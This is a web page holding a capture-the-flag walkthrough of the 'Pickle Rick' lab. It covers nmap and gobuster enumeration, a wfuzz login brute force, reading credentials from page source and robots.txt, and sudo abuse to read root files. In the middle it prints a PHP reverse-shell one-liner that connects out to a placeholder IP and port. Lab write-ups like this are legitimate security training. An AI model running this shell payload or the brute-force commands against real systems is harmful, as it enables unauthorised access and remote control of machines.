<!doctype html>
<html lang="en">

<head>
        <title>Optional but useful: - My Docs</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        
        
        

        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="../../../assets/css/darcula-highlight.min.css">

        <link rel="stylesheet" href="../../../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../../../assets/css/dracula-ui.min.css">
        <link rel="stylesheet" href="../../../assets/css/mkdocs.min.css">

        
            <link  rel="icon" type="image/x-icon" href="../../../assets/img/favicon.ico">
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
                <script>hljs.initHighlightingOnLoad();</script>

</head>

<body class="drac-bg-black-secondary drac-text-grey-ternary drac-text drac-scrollbar-purple">

    <main class="d-flex">

        <!-- block sidebar -->
            <nav id="sidebar" class="sidebar drac-bg-black">
    <div class="custom-menu">
        <button type="button" id="sidebarCollapse" class="btn btn-primary">
            <i class="fa fa-bars"></i>
            <span class="sr-only">Menu</span>
        </button>
    </div>

    <div class="p-4">
        

        <div class="drac-text-center">
            
                <span class="drac-text drac-line-height drac-text-white">My Docs</span>
            
        </div>

        <div class="drac-box flex-column">
            <ul class="dot-ul">
                <li><div class="dot-li drac-bg-cyan"></div></li>
                <li><div class="dot-li drac-bg-green"></div></li>
                <li><div class="dot-li drac-bg-orange"></div></li>
                <li><div class="dot-li drac-bg-pink"></div></li>
                <li><div class="dot-li drac-bg-purple"></div></li>
                <li><div class="dot-li drac-bg-red"></div></li>
                <li><div class="dot-li drac-bg-yellow"></div></li>
            </ul>
        </div>

        <hr class="drac-divider" />

        <!-- block menu -->
        <ul class="mb-5 drac-list drac-list-none">
            
            <li class="drac-box">
                <a href="../../.."
                    class="
                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
                    Welcome to MkDocs
                </a>
            </li>
            <li class="drac-box">
                <a href="../../.."
                    class=" active 
                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
                    data-bs-toggle="collapse" data-bs-target="#easy-collapse" aria-expanded="false">
                    Easy
                </a>
                <div class="collapse" id="easy-collapse">
                    <ul class="mb-5 drac-list drac-list-none">
                            
    <li class="drac-box-ternary">
        <a href="#" class="
            drac-anchor-secondary btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
            data-bs-toggle="collapse" data-bs-target="#pickle-rick-collapse" aria-expanded="false">
            Pickle rick
        </a>

        <div class="collapse" id="pickle-rick-collapse">
            <ul class="mb-5 drac-list drac-list-none">
                    
    <li class="drac-box-ternary">
        <a href="./"
            class=" active 
            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
            Optional but useful:
        </a>
    </li>
            </ul>
        </div>
    </li>
                    </ul>
                </div>
            </li>
        </ul>
        <!-- endblock -->
    </div>
</nav>
        <!-- endblock -->

        <nav class="divider drac-bg-purple-cyan"></nav>

        <div class="content">
            <!-- block header -->
                <header>
    <nav class="navbar navbar-expand-xl drac-bg-purple">
        <div class="container-fluid">
            
            <button class="navbar-toggler w-100 text-center" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
                aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
                <ul class="navbar-nav text-md-center">

                    <!-- block preview -->
                    <li class="nav-item">
                            
        <div class="container">
            <div class="row row-preview">
                <div class="col">
                    <a href="../../.."
                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover">
                        <i class="fa fa-arrow-left"></i> Previous
                    </a>
                </div>
                <div class="col">
                    <a 
                        class="btn-preview drac-btn drac-text-white--hover disabled" style="padding-left: 3%;">
                        Next <i class="fa fa-arrow-right"></i>
                    </a>
                </div>
            </div>
        </div>
                    </li>
                    <!--  endblock -->

                    <!-- block search -->
                    <li class="nav-item"><div role="search" class="search-box">
	<form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
		<input type="text" name="q" class="drac-input drac-input-search drac-input-white drac-text-white drac-bg-black-secondary"
		placeholder="Search docs" title="Type search term here" />
	</form>
</div>
                    </li>
                    <!--  endblock -->

                    <!-- block source -->
                    <li class="nav-item">
                        
                    </li>
                    <!--  endblock -->

                </ul>
            </div>

        </div>
    </nav>
</header>
            <!-- endblock -->

            <!-- block content -->
                <section class="p-md-5 section-content">
    <article>
        <p><h1 id="optional-but-useful">Optional but useful:</h1>
<p>When starting the machine, I got the IP and put it in hosts. To make it more efficient at getting to the site. IP: 10.10.108.239; host: rick.thm.</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>An important step in web enumeration is to get the nmap scan.</p>
<p><img alt="namp_scan" src="../assets/nmap_scan.png" /></p>
<p>After seeing port: 80 (http port), we know there is a website involved. We also need to note that port: 22 (ssh port) is also open, which means we can possibly gain root access.</p>
<p>After going to the website, we see this</p>
<p><img alt="home_scree" src="../assets/home_screen.png" /></p>
<p>We now know our goal, which is to find the last three secret ingredients to change Rick back into a person.</p>
<h1 id="enumeration">Enumeration</h1>
<p>After digging deeper, you can see in the inspect element the username.</p>
<p><img alt="user_name" src="../assets/user_name.png" /></p>
<p>Username: R1ckRul3s</p>
<p>Very useful information; now we know there has to be some type of login page for this.</p>
<p>Knowing that a new page is needed using a fuzzing tool or directory brute forcing tool. The one I used was "gobsuter." Knowing we need to find a different page I used the payload of</p>
<p><code>gobuster dir -u http://rick.thm -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php</code></p>
<p>Got the results of:</p>
<p><img alt="gobuster_result" src="../assets/gobuster_result.png" /></p>
<p>After looking at the results, one stands out the most. Login.php is most likely the page we are looking for.</p>
<p>Another page that wasn't listed was robots.txt (which is used for web scrapping); most websites have it. When looking at it, it only has Wubbalubbadubdub; maybe it has a significance.</p>
<p><img alt="password" src="../assets/password.png" /></p>
<p>When using not knowing the password, you can try to brute force the password. Since we already know that the user name is "R1ckRul3s" it cuts down on how long it will take to find the password. After running</p>
<p><code>wfuzz -c -z file,apache-user-enum-2.0.txt --hw 61 -d "username=R1ckRul3s&amp;password=FUZZ" http://rick.thm/login.php</code></p>
<p>The response was this:</p>
<p><img alt="failed_fuzz" src="../assets/failed_fuzz.png" /></p>
<p>Although that random word in Robots.txt might be the password. And bingo, that was the password, and now we are on the portal.php page. So the username and password was R1ckRul3s, Wubbalubbadubdub.</p>
<p><img alt="portal" src="../assets/protal.png" /></p>
<p>After looking around in the different tabs, it looks like we only have access to the commands section.</p>
<p><img alt="denied" src="../assets/denied.png" /></p>
<p>This command panel might be what we need for the first ingredient. When you run 'ls' in the panel, it shows what is in the directory.</p>
<p><img alt="dir1" src="../assets/dir1.png" /></p>
<p>When trying to read the file, it looks like we can't use the cat command. It is important to note that we are the user www-data. After multiple different commands to read the file, I found that the 'less' command works. Running</p>
<p><code>less Sup3rS3cretPickl3Ingred.txt</code></p>
<p>We get the first ingredient. Now we need to find the next two to help Rick turn back to normal. Looking back on the first directory, there is a text file named clue. Running the less command on the clue.txt says "Look around the file system for the other ingredient.".</p>
<p>After running pwd, we see that we are in the /var/www/html file path. We are not able to change the directory using cd, which means that we have to traverse the file system via the 'ls' command.</p>
<p>After looking, there is a file named "second ingredients" when running:
<code>ls ../../../home/rick/</code></p>
<p>Instead of using the command panel, we can run a reverse PHP shell, which allowed access to the www-data user via the command line.
Payload:
    <code>php -r '$sock=fsockopen("[MACHINE IP]",[PORT NUMBER]);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
<p>Now we can use all of the commands that this user can do. Which also means that the website had some client-side filiters.</p>
<p>When running: <code>cat "second ingredients"</code> we get the second ingredient. It is required to have quotations around the second ingredients, since the command line thinks it is two different things. Now on to the third and final ingredient.</p>
<p>Most likely, the final ingredient would be in the root directory. When trying to ls the directory, there is an error saying we don't have the permissions. Although we can try the sudo command to get permission. Running: <code>sudo ls -la root</code> we see that 3rd.txt is in the root directory.</p>
<p>We now need to run the less command to see the file: <code>sudo less root/3rd.txt</code>. It works! The third and final ingredient was found, and Rick is now back to a normal person.</p>
<h1 id="conclusion">Conclusion</h1>
<p>At the beginning, using nmap to see the open ports and using gobuster to find the directories. We were able to gain access to the login page. Using the command panel to get the first ingredient, then using a PHP reverse shell to gain access to the machine. Finding the second ingredient in <code>/home/rick/</code>. Finally, finding the last indgredient in <code>/root/3rd.txt</code> using sudo to gain permission.</p></p>
    </article>
</section>
            <!-- endblock -->

            <!-- block footer -->
                <footer>
    <div class="d-flex flex-sm-row justify-content-between py-2 border-top drac-text-black drac-bg-cyan-green">
        <a href="https://github.com/dracula/mkdocs" target="_blank" style="padding-left: 1%;"
            class="footer-text drac-anchor drac-text-black drac-text-purple--hover">
            Made with Dracula Theme for MkDocs
        </a>
    </div>
</footer>
            <!-- endblock -->
        </div>

    </main>

        <script>var base_url = '../../..';</script>
        <script src="../../../assets/js/jquery-3.3.1.slim.min.js"></script>
        <script src="../../../assets/js/bootstrap.bundle.min.js"></script>
        <script src="../../../assets/js/mkdocs.js"></script>
			<script src="../../../search/main.js" defer></script>

</body>

</html>